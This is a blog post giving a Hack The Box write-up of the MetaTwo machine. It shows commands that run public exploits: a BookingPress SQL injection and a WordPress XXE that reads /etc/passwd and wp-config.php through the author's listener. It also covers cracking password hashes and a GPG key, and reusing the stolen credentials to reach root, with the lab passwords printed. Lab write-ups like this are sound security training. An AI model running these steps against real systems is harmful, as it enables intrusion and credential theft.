@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Nmapnmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan 123456789101112131415PORT   STATE SERVICE VERSION21&#x2F;tcp open  ftp| fingerprint-strings: |   GenericLines: |     220 ProFTPD Server (Debian) [">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-MetaTwo">
+<meta property="og:url" content="https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/index.html">
+<meta property="og:site_name" content="Panosoiko Blog">
+<meta property="og:description" content="Nmapnmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan 123456789101112131415PORT   STATE SERVICE VERSION21&#x2F;tcp open  ftp| fingerprint-strings: |   GenericLines: |     220 ProFTPD Server (Debian) [">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(nonce).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(poc).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(Hash-id).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(Manager_Dash).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(CVE-MEDIA).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(decoding).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(Wp-config).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(johncrack).png">
+<meta property="article:published_time" content="2024-11-06T12:45:18.000Z">
+<meta property="article:modified_time" content="2024-11-06T12:48:23.874Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/MetaTwo/MT(nonce).png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-MetaTwo</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/31/HTB-CozyHosting/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&text=HTB-MetaTwo"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&is_video=false&description=HTB-MetaTwo"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-MetaTwo&body=Check out this article: https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&name=HTB-MetaTwo&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&t=HTB-MetaTwo"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Website"><span class="toc-number">2.</span> <span class="toc-text">Website</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Event-Form"><span class="toc-number">3.</span> <span class="toc-text">Event Form</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-the-hash"><span class="toc-number">3.0.1.</span> <span class="toc-text">Cracking the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Manager-Dashboard"><span class="toc-number">3.0.2.</span> <span class="toc-text">Manager Dashboard</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ftp"><span class="toc-number">4.</span> <span class="toc-text">Ftp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-MetaTwo
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-06T12:45:18.000Z" class="dt-published" itemprop="datePublished">2024-11-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p><code>nmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]</span><br><span class="line">|     Invalid command: try being more creative</span><br><span class="line">|_    Invalid command: try being more creative</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)</span><br><span class="line">|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)</span><br><span class="line">|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://metapress.htb/</span><br></pre></td></tr></table></figure>
+
+<h1 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h1><p>Domain &#x3D; <code>metapress.htb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.186 metapress.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>Its wordpress so we can do a basic scan with the tool <code>wpscan</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://metapress.htb/</span><br></pre></td></tr></table></figure>
+<p>The scan gave us some good info like <code>WordPress version 5.6.2</code> and  <code>PHP/8.0.24</code><br>Potential CVE if we manage to get a user CVE-2021-29447<br><a target="_blank" rel="noopener" href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p>
+<h1 id="Event-Form"><a href="#Event-Form" class="headerlink" title="Event Form"></a>Event Form</h1><p>The even form has no SSTI. Also i tried looking into other tickets to maybe get some email adresses.<br>The request is this and the <code>appointment_id</code> the base64 encoded<br><a target="_blank" rel="noopener" href="http://metapress.htb/thank-you/?appointment_id=MQ==">http://metapress.htb/thank-you/?appointment_id=MQ==</a><br><code>echo &quot;MQ==&quot; | base64 -d</code> the output was 1 I will try to brute force it in burp<br>I run the first 100 ids but nothing expect mine came back with info</p>
+<p>Looking into the source code we find that it runs bookingpress a CVE that might works is<br><a target="_blank" rel="noopener" href="https://github.com/destr4ct/CVE-2022-0739">CVE-2022-0739</a></p>
+<p>In the poc it says we need the <code>nonce</code> we can find that if we look on the event page source code by searching <code>_wpnonce</code>.<br><img src="/images/MetaTwo/MT(nonce).png" alt="Wpnonce"><br>After running the poc we get:<br><img src="/images/MetaTwo/MT(poc).png" alt="POC"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|</span><br><span class="line">|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-the-hash"><a href="#Cracking-the-hash" class="headerlink" title="Cracking the hash"></a>Cracking the hash</h3><p>I run <code>hash-identifier</code> and i found that the hash is MD5(Wordpress)<br><img src="/images/MetaTwo/MT(Hash-id).png" alt="Hash-id"><br>With a quick search we find that the hashcat mode is 400 (from this website <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hashes.txt -m 400 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>Manager hash cracked</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</span><br></pre></td></tr></table></figure>
+<p><code>Manager:partylikearockstar </code></p>
+<h3 id="Manager-Dashboard"><a href="#Manager-Dashboard" class="headerlink" title="Manager Dashboard"></a>Manager Dashboard</h3><p><img src="/images/MetaTwo/MT(Manager_Dash).png" alt="ManagerDash"><br>As we can see we don’t have alot of privilages to change the website but we can upload media. From the initial recon I had found the CVE-2021-29447<br><a target="_blank" rel="noopener" href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p>
+<p>We can run the poc code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>and we get a base64 encoded message<br><img src="/images/MetaTwo/MT(CVE-MEDIA).png" alt="Decode"><br>we can decode that by putting it on the <code>decode.php</code> and running</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decode.php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MetaTwo/MT(decoding).png" alt="Decoder"><br>Now we will try to get the &#x2F;wpconfig.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f ../wp-config.php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MetaTwo/MT(Wp-config).png" alt="wp-cong"><br>After decoding it we find:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;FS_METHOD&#x27;, &#x27;ftpext&#x27; );</span><br><span class="line">define( &#x27;FTP_USER&#x27;, &#x27;metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_PASS&#x27;, &#x27;9NYS_ii@FyL_p5M2NvJ&#x27; );</span><br><span class="line">define( &#x27;FTP_HOST&#x27;, &#x27;ftp.metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_BASE&#x27;, &#x27;blog/&#x27; );</span><br><span class="line">define( &#x27;FTP_SSL&#x27;, false );</span><br></pre></td></tr></table></figure>
+<p>the ftp username and password <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code><br>(and some db creds)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;blog&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;635Aq@TdqrCwXFUZ&#x27; );</span><br></pre></td></tr></table></figure>
+
+<h1 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br></pre></td></tr></table></figure>
+<p>Using the creds we got <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code> we can login to ftp. Inside the ftp we find another app that runs named <code>mailer</code>.  Inside there there is a file <code>send_email.php</code> we can download that file to our system with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get send_email.php</span><br></pre></td></tr></table></figure>
+<p>In there we find user and pass and another port <code>587</code> that we didnt see on nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$mail-&gt;Host = &quot;mail.metapress.htb&quot;;</span><br><span class="line">$mail-&gt;SMTPAuth = true;                          </span><br><span class="line">$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 </span><br><span class="line">$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           </span><br><span class="line">$mail-&gt;SMTPSecure = &quot;tls&quot;;                           </span><br><span class="line">$mail-&gt;Port = 587; </span><br></pre></td></tr></table></figure>
+
+<p>We can try use those creds to login via ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@metapress.htb</span><br></pre></td></tr></table></figure>
+<p>Creds worked and we have a shell as <code>jnelson</code></p>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Doing <code>ls -la</code> we can see a folder that its not common on linux machines a <code>passpie</code> folder<br>that holds some keys<br>The passpie export command exports the credentials saved in passpie in plain text. <code>passpie export password.db</code> but we dont have the passphrase.</p>
+<p>We will download our keys to our machine with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./keys</span><br></pre></td></tr></table></figure>
+<p>First let us generate the password hash from the private GPG key using gpg2john and save it into a file named keys.hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg2john keys &gt; keys.hash</span><br></pre></td></tr></table></figure>
+<p>We can now try brute-forcing the password hash and see if we can be cracked. We can use “John The Ripper” for this purpose</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MetaTwo/MT(johncrack).png" alt="John"><br>and we get <code>blink182</code> as passpi passphrase.</p>
+<p>Now we can do</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passpie export ~/password.db</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/password.db</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;p7qfAZt4_A1xo_0x&#x27;</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure>
+<p>We got creds for root <code>root:p7qfAZt4_A1xo_0x</code> now we can just ssh to root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@metapress.htb</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Website"><span class="toc-number">2.</span> <span class="toc-text">Website</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Event-Form"><span class="toc-number">3.</span> <span class="toc-text">Event Form</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-the-hash"><span class="toc-number">3.0.1.</span> <span class="toc-text">Cracking the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Manager-Dashboard"><span class="toc-number">3.0.2.</span> <span class="toc-text">Manager Dashboard</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ftp"><span class="toc-number">4.</span> <span class="toc-text">Ftp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&text=HTB-MetaTwo"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&is_video=false&description=HTB-MetaTwo"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-MetaTwo&body=Check out this article: https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&title=HTB-MetaTwo"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&name=HTB-MetaTwo&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2024/11/06/HTB-MetaTwo/&t=HTB-MetaTwo"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
